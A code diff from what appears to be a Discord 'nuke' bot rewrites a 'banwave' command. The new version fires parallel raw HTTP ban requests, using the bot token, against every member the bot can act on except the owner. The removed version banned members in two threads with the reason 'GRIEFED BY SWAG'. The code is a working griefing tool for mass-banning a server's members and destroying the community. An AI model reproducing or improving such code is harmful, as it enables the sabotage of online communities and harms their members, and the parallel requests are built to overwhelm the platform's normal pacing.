@@ -1,13 +1,20 @@
 package me.comu.exeter.commands.nuke;
 
+import me.comu.exeter.core.Config;
 import me.comu.exeter.core.Core;
 import me.comu.exeter.interfaces.ICommand;
 import me.comu.exeter.logging.Logger;
 import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
-import java.util.ArrayList;
+import java.io.IOException;
 import java.util.Arrays;
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 import java.util.stream.Collectors;
 
 public class BanwaveCommand implements ICommand {
@@ -20,46 +27,37 @@ public class BanwaveCommand implements ICommand {
 
         Logger.getLogger().print("Initiating Ban Wave...");
         List<String> members = event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).map(member -> member.getId()).collect(Collectors.toList());
-        int size = members.size();
-        List<String> first = new ArrayList<>();
-        List<String> second = new ArrayList<>();
-        for (int i = 0; i < size / 2; i++)
-            first.add(members.get(i));
-        for (int i = size / 2; i < size; i++)
-            second.add(members.get(i));
-        Thread wave1 = new Thread(() -> {
-        for (String member : first)
-            event.getGuild().ban(member, 0).reason("GRIEFED BY SWAG").queue();
-        });
-        Thread wave2 = new Thread(() -> {
-            for (String member : second)
-                event.getGuild().ban(member, 0).reason("GRIEFED BY SWAG").queue();
-        });
+// Lists.partition(members, 25).parallelStream().forEach({
+//
+//                };
+            ExecutorService executorService = Executors.newFixedThreadPool(15);
+        Runnable wave = () -> {
+            for (String member : members) {
+                OkHttpClient client = new OkHttpClient();
+                Request request = new Request.Builder()
+                        .url(String.format("https://discord.com/api/v7/guilds/%s/bans/%s", event.getGuild().getId(), member))
+                        .put(RequestBody.create(null, ""))
+                        .addHeader("Authorization", "Bot " + Config.get("TOKEN"))
+                        .build();
+                try {
+                    Response response = client.newCall(request).execute();
+                    if (response.isSuccessful()) {
+                        Logger.getLogger().print("Banned " + member + "\n" + response.body() + "\n");
+                    } else {
+                        Logger.getLogger().print(response.message());
+                    }
 
-        wave1.start();
-        wave2.start();
-        /*
-        	public static void BanGuildMember(this DiscordClient client, ulong guildId, ulong userId, string reason = null, uint deleteMessageDays = 0U)
-		{
-			client.HttpClient.Put(string.Format("/guilds/{0}/bans/{1}?delete-message-days={2}&reason={3}", new object[]
-			{
-				guildId,
-				userId,
-				deleteMessageDays,
-				reason
-			}), "");
-		}
-         */
-//        event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());
-
-     /*   for (Member member : event.getGuild().getMembers()) {
-                if (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member)) {
-                    event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG").queue();
-                 Logger.getLogger().print("Banned " + member.getUser().getName() + "#" + member.getUser().getDiscriminator());
+                } catch (IOException ex) {
+                    ex.printStackTrace();
+                }
             }
-    }*/
+        };
+        for (int i = 0; i < 15; i++) {
+            executorService.submit(wave);
+        }
 
-}
+
+    }
 
 
     @Override
@@ -74,10 +72,10 @@ public class BanwaveCommand implements ICommand {
 
     @Override
     public String[] getAlias() {
-        return new String[] {"bw","banwave"};
+        return new String[]{"bw", "banwave"};
     }
 
-     @Override
+    @Override
     public Category getCategory() {
         return Category.OWNER;
     }
